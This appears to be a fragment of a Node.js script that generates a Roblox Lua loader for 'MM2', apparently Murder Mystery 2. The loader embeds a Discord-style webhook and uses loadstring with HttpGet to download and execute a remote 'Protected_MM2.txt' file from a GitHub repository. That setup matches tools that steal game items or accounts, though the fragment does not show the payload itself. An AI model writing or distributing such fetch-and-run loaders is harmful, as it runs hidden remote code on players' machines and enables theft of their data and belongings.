require('dotenv').config();
 ...
 const repoOwner = process.env.REPO_OWNER || 'SharScript';
 const repoName = process.env.REPO_NAME || 'MM2';
...
Webhook = "${webhook}"
 ...
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SharScript/MM2/refs/heads/main/Protected_MM2.txt", true))()`;
